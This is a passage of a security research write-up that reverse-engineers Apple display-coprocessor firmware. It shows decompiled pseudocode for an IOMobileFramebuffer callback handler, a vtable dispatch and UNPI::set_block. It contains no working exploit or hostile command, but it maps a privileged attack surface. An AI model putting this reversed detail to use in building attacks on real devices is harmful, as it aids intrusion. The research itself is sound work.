 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">At the the bottom of this switch statement is the invocation of the callback handler:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.727f8d6109f87f45ecfc47e4cbc67fff73f299cf"></a><a id="t.8"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">ret </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;handler_fptr</span><span class="HovzfPYjjR-c1">(</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; meta</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; in_struct_ptr</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; in_struct_size</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; out_struct_ptr</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; out_struct_size</span><span class="HovzfPYjjR-c1">);</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c7">in_struct_ptr</span><span>&nbsp;points to a copy of the serialised </span><span class="HovzfPYjjR-c7">IOConnectCallMethod</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;arguments we saw being serialized earlier on the application processor:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.a1bc79b6e0e53aa6513e954a3be969c86fa9de29"></a><a id="t.9"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">arg_struct</span><span class="HovzfPYjjR-c1">:</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;task</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp;task</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp; u64 scalar_input_0</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp; u64 scalar_input_1</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; u64</span><span class="HovzfPYjjR-c1">[]</span><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp;remaining_scalar_inputs</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp; u32 cntExtraScalars</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; u8</span><span class="HovzfPYjjR-c1">[]</span><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp;structInput</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp; u64 cntStructInput</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">}</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">The callback unpacks that buffer and calls a C++ virtual function:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.423c597cfa08d39f62002779d1150a8e593d7557"></a><a id="t.10"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">int</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">callback_handler_A435</span><span class="HovzfPYjjR-c1">(</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; u8</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">&nbsp;meta</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">void</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">args</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint32_t args_size</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">void</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">out_struct_ptr</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp; uint32_t out_struct_size</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; int64 instance_id</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint64_t instance</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;err</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;retval</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;result</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c10"><span class="HovzfPYjjR-c0 HovzfPYjjR-c2"></span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; instance_id </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;meta</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">instance_id</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; instance </span><span class="HovzfPYjjR-c1">=</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; global_instance_table</span><span class="HovzfPYjjR-c1">[</span><span class="HovzfPYjjR-c0">instance_id</span><span class="HovzfPYjjR-c1">].</span><span class="HovzfPYjjR-c14">IOMobileFramebufferType</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">if</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">!</span><span class="HovzfPYjjR-c0">instance </span><span class="HovzfPYjjR-c1">)</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; log_fatal</span><span class="HovzfPYjjR-c1">(</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c22">"IOMFB: %s: no instance for instance ID: %u\n"</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c22">"static T *IOMFB::InstanceTracker::instance"</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c22">"(IOMFB::InstanceTracker::tracked_entity_t, uint32_t)"</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c22">" [T = IOMobileFramebuffer]"</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; instance_id</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c1">}</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; err </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1 HovzfPYjjR-c11">(</span><span class="HovzfPYjjR-c0 HovzfPYjjR-c11">instance</span><span class="HovzfPYjjR-c1 HovzfPYjjR-c11">-</span><span class="HovzfPYjjR-c4 HovzfPYjjR-c11">16</span><span class="HovzfPYjjR-c1 HovzfPYjjR-c11">)-&gt;</span><span class="HovzfPYjjR-c0 HovzfPYjjR-c11">vtable_0x378</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c30">// virtual call</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">instance</span><span class="HovzfPYjjR-c1">-</span><span class="HovzfPYjjR-c4">16</span><span class="HovzfPYjjR-c1">),</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;args</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">task</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;args</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">scalar_input_0</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;args</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">scalar_input_1</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;args</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;args</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">cntExtraScalars</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;args</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">structInput</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;args</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">cntStructInput</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c10"><span class="HovzfPYjjR-c0 HovzfPYjjR-c2"></span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; retval </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;convert_error</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">err</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; result </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c1">*(</span><span class="HovzfPYjjR-c0">_DWORD </span><span class="HovzfPYjjR-c1">*)</span><span class="HovzfPYjjR-c0">out_struct_ptr </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;retval</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">return</span><span class="HovzfPYjjR-c0">&nbsp;result</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">}</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The challenge here is to figure out where</span><span>&nbsp;</span><span class="HovzfPYjjR-c11">that virtual call</span><span>&nbsp;goes</span><span>. The object is being looked up in a global table based on the instance id. We can't just set a breakpoint and whilst emulating the firmware is probably possible that would likely be a long project in itself. I took a hackier approach: we know that the vtable needs to be at least </span><span class="HovzfPYjjR-c7">0x380</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;bytes large so just go through all those vtables, decompile them and see if the prototypes look reasonable!</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>There's one clear match in the vtable for the </span><span class="HovzfPYjjR-c7">UNPI</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;type:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2"></span></p><a id="t.ac38f56155b7d2697b0aee9ae6858f6b42815b34"></a><a id="t.11"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">UNPI</span><span class="HovzfPYjjR-c1">::</span><span class="HovzfPYjjR-c0">set_block</span><span class="HovzfPYjjR-c1">(</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; UNPI</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">this</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;task</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">&nbsp;caller_task_ptr</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;first_scalar_input</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;second_scalar_input</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; uint32_t cnt_remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; uint8_t </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">structure_input_buffer</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; uint64_t structure_input_size</span><span class="HovzfPYjjR-c1">)</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>Here's my reversed implementation of </span><span class="HovzfPYjjR-c6 HovzfPYjjR-c2">UNPI::set_block</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2"></span></p><a id="t.3aba48cdaac58ae867b60889bc2f2ff94e4953a6"></a><a id="t.12"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">UNPI</span><span class="HovzfPYjjR-c1">::</span><span class="HovzfPYjjR-c0">set_block</span><span class="HovzfPYjjR-c1">(</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; UNPI</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">this</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;task</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">&nbsp;caller_task_ptr</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;first_scalar_input</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;second_scalar_input</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; uint32_t cnt_remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; uint8_t </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">structure_input_buffer</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; uint64_t structure_input_size</span><span class="HovzfPYjjR-c1">)</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;block_handler_holder </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">holder</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;metadispatcher metadisp</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c10"><span class="HovzfPYjjR-c0 HovzfPYjjR-c2"></span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">if</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">&nbsp;second_scalar_input </span><span class="HovzfPYjjR-c1">)</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">return</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0x80000001LL</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; holder </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">this</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c14">UPPipeDCP_H13P</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">block_handler_holders</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">if</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">!</span><span class="HovzfPYjjR-c0">holder </span><span class="HovzfPYjjR-c1">)</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">return</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0x8000000BLL</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c10"><span class="HovzfPYjjR-c0 HovzfPYjjR-c2"></span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; metadisp</span><span class="HovzfPYjjR-c1">.</span><span class="HovzfPYjjR-c0">address_of_some_zerofill_static_buffer </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">&amp;</span><span class="HovzfPYjjR-c0">unk_3B8D18</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; metadisp</span><span class="HovzfPYjjR-c1">.</span><span class="HovzfPYjjR-c0">handlers_holder </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;holder</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; metadisp</span><span class="HovzfPYjjR-c1">.</span><span class="HovzfPYjjR-c0">structure_input_buffer </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;structure_input_buffer</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; metadisp</span><span class="HovzfPYjjR-c1">.</span><span class="HovzfPYjjR-c0">structure_input_size </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;structure_input_size</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; metadisp</span><span class="HovzfPYjjR-c1">.</span><span class="HovzfPYjjR-c0">remaining_scalar_inputs </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; metadisp</span><span class="HovzfPYjjR-c1">.</span><span class="HovzfPYjjR-c0">cnt_remaining_sclar_input </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;cnt_remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; metadisp</span><span class="HovzfPYjjR-c1">.</span><span class="HovzfPYjjR-c0">some_flags </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0x40000000LL</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; metadisp</span><span class="HovzfPYjjR-c1">.</span><span class="HovzfPYjjR-c0">dispatcher_fptr </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;a_dispatcher</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; metadisp</span><span class="HovzfPYjjR-c1">.</span><span class="HovzfPYjjR-c0">offset_of_something_which_looks_serialization_related </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">&amp;</span><span class="HovzfPYjjR-c0">off_1C1308</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">return</span><span class="HovzfPYjjR-c0">&nbsp;metadispatch</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">holder</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;first_scalar_input</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">1</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;caller_task_ptr</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;structure_input_buffer</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">&amp;</span><span class="HovzfPYjjR-c0">metadisp</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">}</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>This method wraps up the arguments into another structure I've called </span><span class="HovzfPYjjR-c7">metadispatcher</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.70518115c511a294cd855553b9003a0771a08ccd"></a><a id="t.13"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
